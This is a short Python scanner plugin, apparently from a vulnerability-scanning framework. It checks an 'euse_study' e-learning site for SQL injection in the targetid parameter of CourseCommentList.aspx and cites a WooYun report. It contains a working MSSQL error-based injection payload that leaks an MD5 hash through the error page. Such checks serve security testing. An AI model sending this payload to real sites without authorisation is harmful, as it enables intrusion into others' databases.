#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:xq17
#ref::http://www.wooyun.org/bugs/wooyun-2015-0135012

def assign(service,arg):
    if service=="euse_study":
        return True,arg 
    


def  audit(arg):
    ps=[
        "Course/CourseCommentList.aspx?type=2&targetid=%27%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))=0%20and%20%27%%27=%27%",
        # "Course/CourseCommentList.aspx?type=2%27%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))=0%20and%20%27%%27=%27%&targetid=11"
        ]
    for p in ps:
        url=arg+p
        code, head, res, errcode, _ = curl.curl2(url)
        if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
            security_hole(url)  


            return arg
if __name__== '__main__':
    from dummy import *
